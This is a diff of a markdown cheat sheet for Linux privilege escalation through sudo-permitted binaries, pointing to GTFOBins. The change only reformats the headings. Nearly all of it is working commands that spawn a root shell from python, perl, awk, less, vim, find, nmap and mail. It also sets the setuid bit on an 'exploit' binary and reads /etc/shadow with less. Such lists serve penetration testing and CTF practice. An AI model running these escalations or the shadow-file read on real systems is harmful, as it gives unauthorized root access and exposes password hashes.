@@ -5,68 +5,50 @@
 #### Exhaustive list
 https://gtfobins.github.io/
 
-#### Python
 ```
+➤ Python
 sudo -u root /usr/bin/python
 >>> from subprocess import call
 >>> call(['/bin/bash'])
-```
 
-#### Perl
-```
+➤ Perl
 sudo -u root /usr/bin/perl -e ‘`/bin/bash`’
-```
 
-#### CP + Chmod
-```
+➤ CP + Chmod
 sudo -u root /bin/cp exploit exploit
 sudo -u root /bin/chmod +xs exploit
 ./exploit
-```
 
-#### Awk
-```
+➤ Awk
 awk 'BEGIN {system("/bin/bash")}'
-```
 
-#### Less
-```
-Solution 1 - read a file
+➤ Less
+• Solution 1 - read a file
 sudo -u root /usr/bin/less /etc/shadow
  
-Solution 2 - create a file
+• Solution 2 - create a file
 sudo -u root /usr/bin/less 
 then insert the following command :
 !/bin/bash
-```
 
-#### Vim
-```
+➤ Vim
 sudo -u victim /usr/bin/vim
 then write the following command (same way to quit vim :!q):
 :!/bin/bash
-```
 
-#### Find
-```
+➤ Find
 sudo -u root /usr/bin/find /bin -name "bash" -exec {} \;
-```
 
-#### Bash
-```
+➤ Bash
 sudo -u root /bin/bash
-```
 
-#### Nmap
-```
+➤ Nmap
 sudo -u nmap –interactive
 nmap>!bash
 or
 nmap>!sh
-```
 
-#### Mail
-```
+➤Mail
 sudo mail --exec='!/bin/bash'
 ```
 
